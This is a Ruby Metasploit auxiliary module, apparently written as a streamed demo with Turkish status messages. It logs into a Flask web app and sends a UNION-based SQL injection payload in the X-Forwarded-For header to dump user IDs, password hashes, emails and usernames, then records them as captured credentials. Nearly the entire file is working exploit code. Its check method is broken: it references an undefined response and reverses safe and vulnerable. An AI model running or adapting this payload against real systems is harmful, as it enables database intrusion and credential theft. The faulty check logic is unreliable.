
require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
    'Name' => 'Twitch Demo SQLi',
    'Description' => '
      Helloooo
    ',
    'License' => MSF_LICENSE,
    'Author' =>
      [
          'MDI'
      ],
    'References' => [
      ['CVE', '2018-17179'],
      ['URL', 'https://twitter.com/mdisec']
    ],
      'DisclosureDate' => 'May 17 2019'
    ))

    register_options(
        [
            Opt::RPORT(5000),
            OptString.new('TARGETURI', [true, 'The base path to the Twitch demo', '/']),
            OptString.new('USERNAME', [true, 'Username of your account', '']),
            OptString.new('PASSWORD', [true, 'Password of your account', ''])
        ]
    )
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def login
    print_status('Login olmaya calisiyorum !')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_post' => {
          'username' => username,
          'password' => password,
      }
    })

    if res && res.code == 200 && res.body.include?('Login successful')
      @cookie = res.get_cookies
      print_good("Login oldum !!!")
    else
      fail_with(Failure::NoAccess, 'Credentials are not valid.')
    end
  end

  def sqli

    query = "300.300.300.500' UNION ALL SELECT NULL,(CHR(113)||CHR(107)||CHR(107)||CHR(107)||CHR(113))||"
    query << 'COALESCE(CAST("id" AS VARCHAR(10000))::text,(CHR(32)))||(CHR(110)||CHR(115)||CHR(122)||CHR(114)||CHR(113)||CHR(121))||'
    query << 'COALESCE(CAST("password" AS VARCHAR(10000))::text,(CHR(32)))||(CHR(110)||CHR(115)||CHR(122)||CHR(114)||CHR(113)||CHR(121))||'
    query << 'COALESCE(CAST(email AS VARCHAR(10000))::text,(CHR(32)))||(CHR(110)||CHR(115)||CHR(122)||CHR(114)||CHR(113)||CHR(121))||'
    query << 'COALESCE(CAST(username AS VARCHAR(10000))::text,(CHR(32)))||(CHR(113)||CHR(98)||CHR(112)||CHR(98)||CHR(113)),NULL FROM "public"."user" ORDER BY "id"-- GMwd'


    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'settings'),
      'cookie'    => @cookie,
      'headers' => {
          'X-Forwarded-For' => query,
      }
    })

    if res && res.code == 200
      sonuclar = res.body.match(/qkkkq(.*)nszrqy(.*)nszrqy(.*)nszrqy(.*)qbpbq/)
      id = sonuclar[1]
      password = sonuclar[2]
      username = sonuclar[4]
      email = sonuclar[3]
      print_good(" Veriler elde edildi")
      print_warning("User ID : #{id}")
      print_warning("Password : #{password}")
      print_warning("Username : #{username}")
      print_warning("Email: #{email}")
      report_auth(username, password)

=begin

      create_credential(
          {
              origin_type: :session,
              session_id: session_db_id,
              #post_reference_name: refname,
              username: username,
              private_data: password,
              post_reference_name: 1,
              #private_type: :password,
              #realm_value: rmodule,
              # XXX: add to MDM?
              #realm_key: Metasploit::Model::Realm::Key::RSYNC_MODULE,
              #workspace_id: myworkspace_id
          }
      )
=end

    else
      fail_with(Failure::UnexpectedReply, 'Bisiler oldu ama ne oldu ? .')
    end

  end

  def check
    if res && res.code == 200
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  def run
    login
    sqli
    print_good(" HER SEY COK GUZEL DEGIL HER SEY PATLIYOR !")

  end

  def report_auth(username, password)
    service_data = {
        address: ::Rex::Socket.getaddress(datastore['RHOSTS'],true),
        port: datastore['RPORT'],
        service_name: 'flask',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        username: username,
        private_data: password,
        private_type: :nonreplayable_hash,
        jtr_format: 'bcrypt'
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)
    login_data = {
        access_level: 'Unknown',
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
    }
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
